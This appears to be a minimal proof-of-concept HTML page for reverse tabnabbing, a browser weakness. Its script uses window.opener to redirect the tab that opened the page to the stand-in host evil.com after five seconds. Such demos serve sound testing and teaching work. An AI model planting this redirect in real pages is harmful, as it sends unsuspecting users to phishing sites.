<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tabnabbing PoC</title>
</head>
<body>
    <h2>Click this link:</h2>
    <a href="https://example.com" target="_blank">Open in new tab</a>

    <script>
        setTimeout(() => {
            if (window.opener) {
                window.opener.location = "https://evil.com";
            }
        }, 5000); // Changes parent tab after 5 seconds
    </script>
</body>
</html>
